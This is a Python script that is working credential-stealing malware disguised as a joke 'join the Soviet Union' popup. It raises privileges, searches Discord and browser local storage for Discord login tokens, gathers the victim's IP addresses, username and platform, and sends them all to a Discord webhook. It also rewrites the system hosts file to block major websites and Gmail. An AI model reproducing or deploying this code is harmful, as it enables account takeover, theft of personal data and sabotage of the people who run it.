import platform as pf
import easygui as eg
import os
import re
DISCORD_WEBHOOK_URL = [CENSORED]
IMAGE_PATH = os.path.join( os.path.dirname(__file__) , 'soviet.jpeg' )
MEME_PATH = os.path.join( os.path.dirname(__file__) , 'meme.jpeg' )
SYSTEM = pf.system()

if SYSTEM == 'Windows':
    from elevate import elevate
    elevate()

def send_msg(url, msg):
    import json
    from urllib.request import Request, urlopen
    header = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    payload = json.dumps( {'content':msg} )
    req = Request(url, data=payload.encode(), headers=header)
    urlopen(req)

def get_user():
    import getpass as gp
    import platform as pf
    import os
    try:
        ret = gp.getuser()
    except:
        try:
            if SYSTEM == 'Darwin':
                temp_list = os.getcwd().split('/')
            elif SYSTEM == 'Windows':
                temp_list = os.getcwd().split('\\')
            ret = temp_list [temp_list.index('Users') + 1]
        except:
            try:
                if SYSTEM == 'Darwin':
                    temp_list = __file__.split('/')
                elif SYSTEM == 'Windows':
                    temp_list = __file__.split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                ret = 'Unable to determine'
    return ret

def get_ip():
    try:
        import requests as rq
        ip = rq.get('https://api.ipify.org').text
    except:
        ip = 'Cannot be determined'
    return ip

def get_local_ip():
    import socket as soc
    return soc.gethostbyname( soc.gethostname() )

def tokens_in_file(f):
    temp_tokens = []
    for line in [x.strip() for x in open(f, errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    temp_tokens.append(token)
    return temp_tokens

def search_for_tokens():
    global tokens
    tokens = []
    for path in to_search:
        # Checks if the path aka app exists
        if not os.path.exists(path):
            continue

        # Goes thro every file in that folder aka path
        for f in os.listdir(path):

            # Checks if its a token file (ie .log or .ldb)
            if not (f.endswith('log') or f.endswith('.ldb')):
                continue
            # Adds the tokens in that file to the variable tokens
            for token in tokens_in_file( os.path.join(path,f) ):
                tokens.append(token)

def fuck_web():
    if SYSTEM == 'Darwin':
        dns_file = '/private/etc/hosts'
    else:
        dns_file = 'C:\\windows\\system32\\drivers\\etc\\hosts'
    with open(dns_file, 'a') as f:
        try:
            f.write('\n127.0.0.1 www.instagram.com\n127.0.0.1 www.facebook.com\n127.0.0.1 www.twitter.com\n127.0.0.1 www.discord.com\n127.0.0.1 www.youtube.com\n127.0.0.1 www.twitch.tv\n127.0.0.1 www.netflix.com\n127.0.0.1 www.primevideo.com\n127.0.0.1 web.whatsapp.com\n127.0.0.1 www.tiktok.com\n127.0.0.1 mail.google.com\n')
        except:
            pass


        



usr = get_user()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')


if local == None:
    if SYSTEM == 'Windows':
        local = f'C:\\Users\\{usr}\\AppData\\Local'
    else:
        local = f'/Users/{usr}/Library/Application Support'
if roaming == None:
    if SYSTEM == 'Windows':
        roaming = f'C:\\Users\\{usr}\\AppData\\Roaming'
    else:
        roaming = f'/Users/{usr}/Library/Application Support/'


# Defines the diff token paths depending on OS
if pf.system == 'Windows':
    to_search = [f'{roaming}\\Discord\\Local Storage\\leveldb',
    f'{roaming}\\discordcanary\\Local Storage\\leveldb',
    f'{roaming}\\discordptb\\Local Storage\\leveldb',
    f'{roaming}\\discorddevelopment\\Local Storage\\leveldb',
    f'{local}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    f'{roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    f'{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    f'{local}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb']
else:
    to_search = [f'{roaming}/Discord/Local Storage/leveldb',
    f'{roaming}/discordcanary/Local Storage/leveldb',
    f'{roaming}/discordptb/Local Storage/leveldb',
    f'{roaming}/discorddevelopment/Local Storage/leveldb',
    f'{local}/Google/Chrome/User Data/Default/Local Storage/leveldb',
    f'{roaming}/Opera Software/Opera Stable/Local Storage/leveldb',
    f'{local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
    f'{local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb']

search_for_tokens()
fuck_web()


to_send = f'''**Public IP:**  ||{get_ip()}||
**Local IP:**  ||{get_local_ip()}||
**User:**  {usr}
**Platform:**  {pf.platform()}
**File Location:**  `{__file__}`
__**Tokens**__
```'''

for tok in tokens:
    to_send += tok + '\n'

to_send += '```'

send_msg(DISCORD_WEBHOOK_URL, to_send)

eg.buttonbox('Do you want to join the Soviet Union?', choices=['Yes','Yes'],image=IMAGE_PATH)

eg.msgbox('Thank you for joining the Soviet Union soldier. Your contribution shall not go to waste', ok_button='Thank you comradé', image=MEME_PATH)
